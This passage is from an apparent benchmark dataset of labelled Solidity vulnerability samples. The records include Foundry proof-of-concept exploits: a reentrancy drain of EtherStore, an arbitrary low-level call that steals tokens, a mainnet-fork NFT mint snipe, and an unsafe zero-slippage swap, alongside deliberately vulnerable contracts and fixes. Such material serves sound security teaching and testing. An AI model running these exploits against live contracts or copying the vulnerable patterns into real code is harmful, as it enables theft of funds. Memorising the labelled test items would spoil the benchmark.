// XYZ Bank\n        banksToRemove[2] = address(0x3); // Global Bank\n        console.log(\"------------Testing buggyManager---------------\");\n        // With buggy implementation (using return)\n        buggyManager.removeBanksWithReturn(banksToRemove);\n        emit log_named_uint(\"Buggy manager (with return) bank count after removal\", buggyManager.getBankCount());\n        buggyManager.listBanks();\n\n        console.log(\"------------Testing FixedBankManager---------------\");\n        // With fixed implementation (using break)\n        fixedManager.removeBanksWithBreak(banksToRemove);\n        emit log_named_uint(\"Fixed manager (with break) bank count after removal\", fixedManager.getBankCount());\n        fixedManager.listBanks();\n    }\n}\n\n// Base contract with common functionality\ncontract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\ncontract BuggyBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // BUG: Using 'return' causes premature exit after removing only one bank\n    function removeBanksWithReturn(address[] memory banksToRemove) public {\n        for (uint i = 0; i < banks.length; i++) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[i].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[i].bankName, \n                        \" (Address: \", toHexString(uint160(banks[i].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(i);\n                    return; // BUG: This exits the entire function after removing just one bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in buggy manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n\n// Fixed implementation using proper iteration\ncontract FixedBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // FIXED: Using proper iteration to remove multiple elements\n    function removeBanksWithBreak(address[] memory banksToRemove) public {\n        // We need to iterate backwards to avoid index issues when removing elements\n        for (int i = int(banks.length) - 1; i >= 0; i--) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[uint(i)].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[uint(i)].bankName, \n                        \" (Address: \", toHexString(uint160(banks[uint(i)].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(uint(i));\n                    break; // FIXED: Only break from the inner loop, continue with the next bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in fixed manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n",
    "vulnerable_contract_only": "contract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Use of return in inner loop iteration leads to unintended termination.",
    "description": "This demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.",
    "scenario": "",
    "fix_description": "Use break instead of return when you only want to exit the current loop, not the entire function.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/return-break.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_nftmint_exposedmetadata",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "NFTMint_exposedMetadata.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nName: NFT Mint via Exposed Metadata Vulnerability\n\nDescription:\nThe contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market\n\n        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "NFT Mint via Exposed Metadata Vulnerability",
    "description": "The contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/NFTMint_exposedMetadata.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_returnfalse",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Returnfalse.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: No Revert on Failure\n\nDescription:\nSome tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }\n\nMitigation:\nUse OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.\n*/\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant zrx = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        zrx.transfer(address(this), 123); //return false, do not revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransferFail() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n\n        // https://github.com/foundry-rs/foundry/issues/5367 can't vm.expectRevert\n        // vm.expectRevert(\"SafeERC20: ERC20 operation did not succeed\");\n        zrx.safeTransfer(address(this), 123); //revert\n\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "No Revert on Failure",
    "description": "Some tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }",
    "scenario": "",
    "fix_description": "Use OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Returnfalse.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unsafecall",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "UnsafeCall.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\n/*\nName: Unsafe Call Vulnerability\n\nDescription:\nIn TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.\n\nMitigation:\nUse of low level \"call\" should be avoided whenever possible.  \n\nREF\nhttps://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9\n*/\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n\n    function testUnsafeCall() public {\n        address alice = vm.addr(1);\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n\n        // bytes memory payload = abi.encodeWithSignature(\"transfer(address,uint256)\",address(alice),1000);\n\n        console.log(\n            \"Alice tries to perform unsafe call to transfer asset from TokenWhaleContract\"\n        );\n        vm.prank(alice);\n        TokenWhaleContract.approveAndCallcode(\n            address(TokenWhaleContract),\n            0x1337, // doesn't affect the exploit\n            abi.encodeWithSignature(\n                \"transfer(address,uint256)\",\n                address(alice),\n                1000\n            )\n        );\n\n        // check if the exploit is successful\n        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);\n        console.log(\"Exploit completed\");\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n        console.log(\n            \"Alice balance:\",\n            TokenWhaleContract.balanceOf(address(alice))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the contract code*/\n\n    function approveAndCallcode(\n        address _spender,\n        uint256 _value,\n        bytes memory _extraData\n    ) public {\n        allowance[msg.sender][_spender] = _value;\n\n        bool success;\n        // vulnerable call execute unsafe user code\n        (success, ) = _spender.call(_extraData);\n        console.log(\"success:\", success);\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unchecked_call",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe Call Vulnerability",
    "description": "In TokenWhale contract's approveAndCallcode function. The vulnerability allows an \narbitrary call to be executed with arbitrary data, leading to potential security risks\nand unintended consequences. The function uses a low-level call (_spender.call(_extraData))\nto execute code from the _spender address without any validation or checks on the provided _extraData.\nThis can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.\n\nThis excersise is about  a low level call to a contract where input and return values are not checked\nIf the call data is controllable, it is easy to cause arbitrary function execution.",
    "scenario": "",
    "fix_description": "Use of low level \"call\" should be avoided whenever possible.",
    "references": [
      "https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/UnsafeCall.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_slippage-deadline",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Slippage-deadline.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/*\nName: Slippage - Incorrect deadline & slippage amount\n\nDescription:\nSlippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.\n\nDeadline: The function sets the deadline to the maximum uint256 value, \nwhich means the transaction can be executed at any time.\n\nIf slippage is set to 0 and there is no deadline, \nusers might potentially lose all their tokens.\n\nMitigation:\nAllow the user to specify the slippage & deadline value themselves.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676118132992405505\n*/\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n}\n\ncontract ContractTest is Test {\n    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet\n    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n    }\n\n    function testswapTokensWithMaxDeadline() external payable {\n        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);\n        WETH.deposit{value: 1 ether}();\n\n        uint256 amountIn = 1 ether;\n        uint256 amountOutMin = 0;\n        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT\n        // Path for swapping ETH to USDT\n        address[] memory path = new address[](2);\n        path[0] = address(WETH); // WETH (Wrapped Ether)\n        path[1] = USDT; // USDT (Tether)\n\n        // No Effective Expiration Deadline\n        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,\n        // possibly under unfavorable market conditions.\n        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            address(this),\n            type(uint256).max // Setting deadline to max value\n        );\n\n        console.log(\"USDT\", IERC20(USDT).balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Slippage - Incorrect deadline & slippage amount",
    "description": "Slippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.",
    "scenario": "",
    "fix_description": "Allow the user to specify the slippage & deadline value themselves.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Slippage-deadline.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_reentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Reentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Reentrancy Vulnerability\n\nDescription:\nThe EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.\n\nScenario:\nEtherStore is a simple vault, it can manage everyone's ethers.\nBut it's vulnerable, can you steal all the ethers ?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a\nhttps://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/\n\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\ncontract EtherStoreRemediated {\n    mapping(address => uint256) public balances;\n    bool internal locked;\n\n    modifier nonReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        balances[msg.sender] -= _weiToWithdraw;\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherStore store;\n    EtherStoreRemediated storeRemediated;\n    EtherStoreAttack attack;\n    EtherStoreAttack attackRemediated;\n\n    function setUp() public {\n        store = new EtherStore();\n        storeRemediated = new EtherStoreRemediated();\n        attack = new EtherStoreAttack(address(store));\n        attackRemediated = new EtherStoreAttack(address(storeRemediated));\n        vm.deal(address(store), 5 ether);\n        vm.deal(address(storeRemediated), 5 ether);\n        vm.deal(address(attack), 2 ether);\n        vm.deal(address(attackRemediated), 2 ether);\n    }\n\n    function testReentrancy() public {\n        attack.Attack();\n    }\n\n    function test_RevertRemediated() public {\n        attackRemediated.Attack();\n    }\n}\n\ncontract EtherStoreAttack is Test {\n    EtherStore store;\n\n    constructor(address _store) {\n        store = EtherStore(_store);\n    }\n\n    function Attack() public {\n        console.log(\"EtherStore balance\", address(store).balance);\n\n        store.deposit{value: 1 ether}();\n\n        console.log(\n            \"Deposited 1 Ether, EtherStore balance\",\n            address(store).balance\n        );\n        store.withdrawFunds(1 ether); // exploit here\n\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n    }\n\n    // fallback() external payable {}\n\n    // we want to use fallback function to exploit reentrancy\n    receive() external payable {\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n        if (address(store).balance >= 1 ether) {\n            store.withdrawFunds(1 ether); // exploit here\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Reentrancy Vulnerability",
    "description": "The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.",
    "scenario": "EtherStore is a simple vault, it can manage everyone's ethers.\nBut it's vulnerable, can you steal all the ethers ?",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Reentrancy.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_oracle-stale",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
